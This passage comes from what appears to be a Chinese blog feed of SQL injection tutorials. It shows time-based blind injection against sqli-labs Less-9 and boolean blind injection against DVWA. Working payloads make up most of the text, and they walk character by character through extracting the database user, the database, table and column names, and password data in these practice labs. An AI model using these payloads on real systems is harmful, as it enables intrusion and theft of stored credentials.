if(ascii(substr(user(),1,1))=114,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1570.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字符是否为：o</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),2,1))=111,sleep(5),1) --+</span><br><span class="line">猜解第三个字符是否为：o</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),3,1))=111,sleep(5),1) --+</span><br><span class="line">猜解第四个字符是否为：t</span><br><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(user(),4,1))=116,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>我就不一一截图了，只截图最后一张：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1571.png" alt="图片"></p><p>这样就可以判断出当前用户是 <code>root </code></p><h3 id="猜解数据库名称"><a href="#猜解数据库名称" class="headerlink" title="猜解数据库名称"></a>猜解数据库名称</h3><p>上帝视角告诉你当前数据库名为：<code>security</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1572.png" alt="图片"></p><p>首先判断数据库名的长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())=8,sleep(5),1) --+</span><br><span class="line">注释：</span><br><span class="line">如果数据库长度为：8，则延时5秒</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1573.png" alt="图片"></p><p>逐字猜解数据库名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),2,1))=101,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：c</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),3,1))=99,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),4,1))=117,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：r</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),5,1))=114,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：i</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),6,1))=105,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：t</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),7,1))=116,sleep(5),1) --+</span><br><span class="line">猜解第一个字符是否为：y</span><br><span class="line">id=1&#x27; and if(ascii(substr(database(),8,1))=121,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>由于语句太多，我就不一一截图了，我就截图最后一张：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli/Less-9/index.php?id=1&#x27; and if(ascii(substr(database(),8,1))=121,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1574.png" alt="图片"></p><p>这样就猜解出来它当前的数据库名为：<code>security</code></p><h3 id="猜解表名"><a href="#猜解表名" class="headerlink" title="猜解表名"></a>猜解表名</h3><p>上帝视角告诉你表名有：<code>emails</code>、<code>referers</code>、<code>uagents</code>、<code>users</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1575.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个表名的第一个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 0,1),1,1))=101,sleep(5),1) --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">想要查询第二个表名，就把 LIMIT 0，1 修改为：LIMIT 1,1 以此类推！</span><br><span class="line">想要查询第二个字符：就吧LIMIT 0,1),1,1 修改为：LIMIT 0,1),2,1 以此类推！</span><br></pre></td></tr></table></figure><p>查询 <code>users</code> 表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第四个表名的第一个字符是否为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),1,1))=117,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第二个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),2,1))=115,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第三个字符是否为：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),3,1))=101,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第四个字符是否为：r</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),4,1))=114,sleep(5),1) --+</span><br><span class="line">猜解第四个表名的第五个字符是否为：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((SELECT distinct concat(table_name) FROM information_schema.tables where table_schema=database() LIMIT 3,1),5,1))=115,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>这里我就截图最后一张了：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1576.png" alt="图片"></p><p>这样就得到了 <code>users</code> 这个表名！</p><h3 id="猜解列名"><a href="#猜解列名" class="headerlink" title="猜解列名"></a>猜解列名</h3><p>上帝视角告诉你 <code>users</code> 的列名有：<code>id</code>、<code>username</code>、<code>password</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1577.png" alt="图片"></p><p>查询 <code>id</code> 列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查询 users 表名下的第一个列名的第一个字段：i</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1,1))=105,sleep(5),1) --+</span><br><span class="line">查询 users 表名下的第一个列名的第二个字段：d</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),2,1))=100,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>查询 <code>username</code> 列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">查询 users 表名下第二个列名的第一个字段：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1,1))=117,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第二个字段：s</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),2,1))=115,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第三个字段：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),3,1))=101,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第四个字段：r</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),4,1))=114,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第五个字段：n</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),5,1))=110,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第六个字段：a</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),6,1))=97,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第七个字段：m</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),7,1))=109,sleep(5),1) --+</span><br><span class="line">查询 users 表名下第二个列名的第八个字段：e</span><br><span class="line">id=1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),8,1))=101,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p>如果有多个列的话就以此类推~</p><h3 id="猜解数据"><a href="#猜解数据" class="headerlink" title="猜解数据"></a>猜解数据</h3><p>上帝视角：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1578.png" alt="图片"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">猜解 password 第一个字符为：D</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),1,1))=68,sleep(5),1) --+</span><br><span class="line">猜解 password 第二个字符为：u</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),2,1))=117,sleep(5),1) --+</span><br><span class="line">猜解 password 第三个字符为：m</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),3,1))=109,sleep(5),1) --+</span><br><span class="line">猜解 password 第四个字符为：b</span><br><span class="line">id=1&#x27; and if(ascii(substr((select password from users limit 0,1),4,1))=98,sleep(5),1) --+</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1579.png" alt="图片"></p><p>这样就猜解出数据了！后面的以此类推!</p><h2 id="公众号"><a href="#公众号" class="headerlink" title="公众号"></a>公众号</h2><p><strong>若有好的建议和合作可以通过公众号与我联系！</strong><br>微信公众号：<code>渗透攻击红队</code><br><img src="https://blog-1259310507.cos.ap-chengdu.myqcloud.com/logo/vxgzh.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> MySQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MySQL手注之布尔型盲注</title>
      <link href="/2020/04/18/MySQL-3/"/>
      <url>/2020/04/18/MySQL-3/</url>
      
        <content type="html"><![CDATA[<h2 id="布尔型盲注简介"><a href="#布尔型盲注简介" class="headerlink" title="布尔型盲注简介"></a>布尔型盲注简介</h2><p>基于布尔型SQL盲注即在SQL注入过程中，应用程序仅仅返回<code>True</code>（页面）和<code>False</code>（页面）。<br>这时，我们无法根据应用程序的返回页面得到我们需要的数据库信息。但是可以通过构造逻辑判断（比较大小）来得到我们需要的信息。</p><p>环境：<code>DVWA</code></p><p>注入点：<code>http://www.saul.com/DVWA/vulnerabilities/sqli_blind</code></p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1543.png" alt="图片"></p><p>我们输入数字<code>1</code>提交，页面提示：<code>User ID exists in the database.</code>，说明<code>ID</code>为<code>1</code>的存在与数据库中！</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1544.png" alt="图片"></p><p>我们输入数字<code>10</code>提交，页面显示：<code>User ID is MISSING from the database</code>，说明<code>ID</code>为<code>10不在</code>数据库中！</p><h3 id="MySQL盲注常用函数"><a href="#MySQL盲注常用函数" class="headerlink" title="MySQL盲注常用函数"></a>MySQL盲注常用函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">length() 返回字符串的长度，例如可以返回数据库名字的长度 </span><br><span class="line">substr() ⽤来截取字符串 </span><br><span class="line">ascii() 返回字符的ascii码</span><br><span class="line">sleep(n) 将程序挂起⼀段时间，n为n秒</span><br><span class="line">if(expr1,expr2,expr3) 判断语句 如果第⼀个语句正确就执⾏第⼆个语句如果错误执⾏第三个语句</span><br></pre></td></tr></table></figure><h2 id="盲注流程"><a href="#盲注流程" class="headerlink" title="盲注流程"></a>盲注流程</h2><h3 id="1、判断是否存在注入，是字符型还是数字型注入"><a href="#1、判断是否存在注入，是字符型还是数字型注入" class="headerlink" title="1、判断是否存在注入，是字符型还是数字型注入"></a>1、判断是否存在注入，是字符型还是数字型注入</h3><p>注入点原查询代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;; </span><br></pre></td></tr></table></figure><p>判断注入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">注入语句：</span><br><span class="line">1&#x27; and 1=1 #</span><br><span class="line">带入查询的语句：</span><br><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=1 #&#x27;;&quot;; </span><br><span class="line">注入语句： </span><br><span class="line">1&#x27; and 1=2 #</span><br><span class="line">带入查询的语句：</span><br><span class="line">$getid  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;1&#x27; and 1=2 #&#x27;;&quot;; </span><br></pre></td></tr></table></figure><p><code>1&#39; and 1=1 #</code> 返回正常：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1545.png" alt="图片"></p><p><code>1&#39; and 1=2 #</code> 返回错误：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1546.png" alt="图片"></p><p>说明存在注入，而且是字符型的注入！（如果是数字型的注入，那么就不用去闭合单引号）</p><h3 id="2、猜解当前数据库名"><a href="#2、猜解当前数据库名" class="headerlink" title="2、猜解当前数据库名"></a>2、猜解当前数据库名</h3><p>猜数据库名长度： </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1 #</span><br><span class="line">1&#x27; and length(database())=2 #</span><br><span class="line">1&#x27; and length(database())=3 # </span><br><span class="line">1&#x27; and length(database())=4 #</span><br></pre></td></tr></table></figure><p><code>1&#39; and length(database())=3 #</code>  ，页面返回错误：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1547.png" alt="图片"></p><p><code>1&#39; and length(database())=4 #</code>，页面返回正常：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1548.png" alt="图片"></p><p>说明当前数据库名长度为<code>4</code>！</p><p>⼆分法逐字猜解：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(database(),1,1))&gt;97 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼤于 97（⼩写字母a的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;122 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 122（⼩写字母z的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;109 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 109（⼩写字母m的ascii值）</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;103 #，显⽰存在，说明数据库名的第⼀个字符的ascii值⼩于 103（⼩写字母g的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))&lt;100 #，显⽰不存在，说明数据库名的第⼀个字符的ascii值不 ⼩于100（⼩写字母d的ascii值）；</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=100 #，显⽰存在，说明数据库名的第⼀个字符的ascii值等于100（⼩写字母d的ascii值），所以数据库名的第⼀个字符的ascii值为100，即⼩写字母d。 </span><br><span class="line">重复以上步骤直到得出完整的数据库名dvwa</span><br><span class="line">1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br><span class="line">... ...</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">猜解数据库第一个字符为：d</span><br><span class="line">1&#x27; and ascii(substr(database(),1,1))=100 #</span><br><span class="line">猜解数据库第二个字符为：v</span><br><span class="line">1&#x27; and ascii(substr(database(),2,1))=118 #</span><br><span class="line">猜解数据库第三个字符为：w</span><br><span class="line">1&#x27; and ascii(substr(database(),3,1))=119 #</span><br><span class="line">猜解数据库第三个字符为：a</span><br><span class="line">1&#x27; and ascii(substr(database(),4,1))=97 #</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">substr（str,start,stop）</span><br><span class="line">substr截取字符串str,从start开始截取，截取stop个字符</span><br></pre></td></tr></table></figure><p>这里我就不一一截图了，我就截图第四个字符串的图：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1549.png" alt="图片"></p><p>这样我们就得到了当前数据库名为：<code>dvwa</code></p><h3 id="3、猜解表名"><a href="#3、猜解表名" class="headerlink" title="3、猜解表名"></a>3、猜解表名</h3><p>猜解表的数量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1 # 显⽰不存在</span><br><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=2 # 显⽰存在</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">原理是使用count()这个函数来判断table_name这个表的数量有几个</span><br><span class="line">然后后面有一个where判断来指定是当前数据库</span><br><span class="line">在末尾有一个 =1 ，意思是判断表有1个，正确那么页面返回正常，错误即返回不正常</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1550.png" alt="图片"></p><p>由上图可知，我们判断出当前数据库名下的表有两个！</p><p>猜解表名长度：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显⽰存在</span><br><span class="line"></span><br><span class="line">注释：</span><br><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1),1) 这条语句就是substr的str,要截取的字符</span><br><span class="line">limit 0,1 这条语句是 limit 子句来限制查询的数量，具体格式是这样的：</span><br><span class="line">select * from tableName limit i,n</span><br><span class="line">tableName：表名</span><br><span class="line">i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span><br><span class="line">n：为查询结果返回的数量</span><br><span class="line">i与n之间使用英文逗号&quot;,&quot;隔开</span><br><span class="line">limit n 等同于 limit 0,n</span><br><span class="line">limit 0,1 默认0（i）就是从1开始</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1551.png" alt="图片"></p><p>由上图可见，我们查询出来第一个表名的长度是<code>9</code>，那么如果想查询第二个表名的长度就用这条语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1))=5 # 显⽰存在</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1552.png" alt="图片"></p><p>由上图可见第二个表名的长度为5，想要继续查下面的表就可以在 <code>limit x,n</code> ，<code>x</code>这个参数继续增加<code>1</code>，这样以此类推就可以查询多个表名的长度！</p><p>猜解表的名字：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个表名的第一个字符长度是否为：g</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=103 # 返回正常</span><br><span class="line">猜解第一个表名的第二个字符长度是否为：u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))=117 # 返回正常</span><br><span class="line">猜解第一个表名的第三个字符长度是否为：e</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1))=101 # 返回正常</span><br><span class="line">猜解第一个表名的第四个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),4,1))=115 # 返回正常</span><br><span class="line">猜解第一个表名的第五个字符长度是否为：t</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),5,1))=116 # 返回正常</span><br><span class="line">猜解第一个表名的第六个字符长度是否为：b</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),6,1))=98 # 返回正常</span><br><span class="line">猜解第一个表名的第七个字符长度是否为：o</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),7,1))=111 # 返回正常</span><br><span class="line">猜解第一个表名的第八个字符长度是否为：o</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),8,1))=111 # 返回正常</span><br><span class="line">猜解第一个表名的第九个字符长度是否为：k</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),9,1))=107 # 返回正常</span><br><span class="line"></span><br><span class="line">语法格式是：</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit i,1),n,1))&gt;97 #</span><br><span class="line">i 是第几个表</span><br><span class="line">n 是第几个字符长度</span><br></pre></td></tr></table></figure><p>这里我就不全部一一截图了，我就截图<code>第九</code>个字符长度为<code>k</code>的：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1553.png" alt="图片"></p><p>这样就查询出来第一个表名为：<code>guestbook</code></p><p>那么想要查询下一个表名就可以使用这个语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个表名的第一个字符长度是否为：u</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=117 # 返回正常</span><br><span class="line">猜解第二个表名的第二个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))=115 # 返回正常</span><br><span class="line">猜解第二个表名的第三个字符长度是否为：e</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),3,1))=101 # 返回正常</span><br><span class="line">猜解第二个表名的第四个字符长度是否为：r</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),4,1))=114 # 返回正常</span><br><span class="line">猜解第二个表名的第五个字符长度是否为：s</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),5,1))=115 # 返回正常</span><br></pre></td></tr></table></figure><p>这里我就不一一截图了，我就截图<code>第五</code>个字符的长度为<code>s</code>：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1554.png" alt="图片"></p><p>这样我们就猜解出来了<code>第二</code>个表名为：<code>users</code></p><h3 id="4、猜解表中的字段名"><a href="#4、猜解表中的字段名" class="headerlink" title="4、猜解表中的字段名"></a>4、猜解表中的字段名</h3><p>猜解字段的数量：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">判断表名users的字段数量是否为8</span><br><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=8 #</span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1555.png" alt="图片"></p><p>由上图可知，字段有<code>8</code>个！</p><p>我们上帝视角看看：</p><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1556.png" alt="图片"></p><p>猜解第⼀个字段的长度（user_id）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字段的长度是否为7：</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1))=7 # </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1557.png" alt="图片"></p><p>猜解第二个字段的长度（first_name）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">猜解第二个字段的长度是否为10：</span><br><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 1,1),1))=10 # </span><br></pre></td></tr></table></figure><p><img src="https://liuwx-1259310507.cos.ap-chengdu.myqcloud.com/img/1558.png" alt="图片"></p><p>如果查询下一个字段就以此类推！</p><p>猜解第⼀个字段名（user_id）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">猜解第一个字段名的第一个字符为：u</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),1,1))=117 #</span><br><span class="line">猜解第一个字段名的第二个字符为：s</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),2,1))=115 #</span><br><span class="line">猜解第一个字段名的第三个字符为：e</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),3,1))=101 #</span><br><span class="line">猜解第一个字段名的第四个字符为：r</span><br><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name= &#x27;users&#x27; limit 0,1),4,1))=114 #</span><br><span class="line">猜解第一个字段名的第五个字符为：_</span><br><span 